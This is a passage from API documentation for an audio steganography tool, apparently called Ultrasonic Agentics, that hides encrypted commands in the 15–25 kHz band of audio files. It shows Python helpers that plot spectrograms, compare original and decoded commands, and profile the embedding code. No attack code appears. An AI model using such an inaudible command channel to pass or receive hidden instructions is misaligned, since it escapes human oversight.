    # Calculate spectrogram
    f, t, Sxx = signal.spectrogram(
        audio_data, 
        fs=audio.frame_rate,
        window='hann',
        nperseg=1024,
        noverlap=512
    )
    
    # Plot spectrogram
    plt.figure(figsize=(12, 8))
    
    plt.subplot(2, 1, 1)
    plt.pcolormesh(t, f, 10 * np.log10(Sxx + 1e-10))
    plt.ylabel('Frequency [Hz]')
    plt.title('Full Spectrogram')
    plt.ylim([0, 25000])
    
    # Plot ultrasonic range
    plt.subplot(2, 1, 2)
    ultrasonic_mask = (f >= 15000) & (f <= 25000)
    plt.pcolormesh(t, f[ultrasonic_mask], 10 * np.log10(Sxx[ultrasonic_mask] + 1e-10))
    plt.ylabel('Frequency [Hz]')
    plt.xlabel('Time [sec]')
    plt.title('Ultrasonic Range (15-25 kHz)')
    
    # Mark target frequencies
    plt.axhline(y=freq_0, color='r', linestyle='--', label=f'Freq 0: {freq_0} Hz')
    plt.axhline(y=freq_1, color='b', linestyle='--', label=f'Freq 1: {freq_1} Hz')
    plt.legend()
    
    plt.tight_layout()
    plt.savefig('ultrasonic_analysis.png', dpi=300)
    plt.show()
    
    # Calculate power at target frequencies
    freq_0_idx = np.argmin(np.abs(f - freq_0))
    freq_1_idx = np.argmin(np.abs(f - freq_1))
    
    power_0 = np.mean(Sxx[freq_0_idx, :])
    power_1 = np.mean(Sxx[freq_1_idx, :])
    
    print(f"Average power at {freq_0} Hz: {10 * np.log10(power_0 + 1e-10):.2f} dB")
    print(f"Average power at {freq_1} Hz: {10 * np.log10(power_1 + 1e-10):.2f} dB")
    
    return {
        'frequencies': f,
        'times': t,
        'spectrogram': Sxx,
        'power_freq_0': power_0,
        'power_freq_1': power_1
    }

# Usage
analysis = debug_ultrasonic_signal('embedded.mp3')
```

#### Bit Error Analysis

```python
def debug_bit_errors(original_command, decoded_command):
    """Analyze bit-level errors in decoding."""
    from agentic_commands_stego.crypto.cipher import CipherService
    
    if not decoded_command:
        print("No command decoded")
        return
    
    print(f"Original:  '{original_command}'")
    print(f"Decoded:   '{decoded_command}'")
    print(f"Match:     {original_command == decoded_command}")
    
    if original_command != decoded_command:
        # Character-level comparison
        print("\nCharacter differences:")
        min_len = min(len(original_command), len(decoded_command))
        
        for i in range(min_len):
            if original_command[i] != decoded_command[i]:
                print(f"  Position {i}: '{original_command[i]}' -> '{decoded_command[i]}'")
        
        if len(original_command) != len(decoded_command):
            print(f"  Length difference: {len(original_command)} -> {len(decoded_command)}")
        
        # Binary comparison
        cipher = CipherService()
        orig_encrypted = cipher.encrypt_command(original_command)
        decoded_encrypted = cipher.encrypt_command(decoded_command)
        
        print(f"\nOriginal encrypted length:  {len(orig_encrypted)}")
        print(f"Decoded encrypted length:   {len(decoded_encrypted)}")

# Usage
debug_bit_errors("original command", "decoded command")
```

### Performance Profiling

```python
import cProfile
import pstats
import time
from functools import wraps

def profile_function(func):
    """Decorator to profile function performance."""
    @wraps(func)
    def wrapper(*args, **kwargs):
        pr = cProfile.Profile()
        pr.enable()
        
        start_time = time.time()
        result = func(*args, **kwargs)
        end_time = time.time()
        
        pr.disable()
        
        # Print timing
        print(f"{func.__name__} took {end_time - start_time:.3f} seconds")
        
        # Print profiling stats
        stats = pstats.Stats(pr)
        stats.sort_stats('cumulative')
        stats.print_stats(10)  # Top 10 functions
        
        return result
    
    return wrapper

# Usage
@profile_function
def test_embedding():
    embedder = AudioEmbedder()
    embedder.embed_file('input.mp3', 'output.mp3', 'test command')

test_embedding()
```

---

This comprehensive API documentation provides everything needed to integrate and use the Ultrasonic Agentics system effectively. For additional support or specific use cases, refer to the examples directory and test files in the repository.